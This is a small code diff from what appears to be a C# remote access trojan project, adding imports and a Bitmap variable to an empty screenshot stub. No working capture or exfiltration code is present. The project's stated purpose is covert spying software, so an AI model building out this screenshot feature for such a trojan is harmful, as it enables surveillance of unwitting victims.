@@ -2,7 +2,12 @@
 using System.Collections.Generic;
 using System.Text;
 using System.Drawing;
-using System.Drawing.Imaging;
+using System.IO;
+using System.Windows.Forms;
+using System.Threading.Tasks;
+using System.Linq;
+
+
 
 namespace remote_access_trojan
 {
@@ -17,6 +22,8 @@ namespace remote_access_trojan
         
         public void takeScreenshot()
         {
+            Bitmap image; 
+
             // take a screenshot here
             // for now, save it
         }
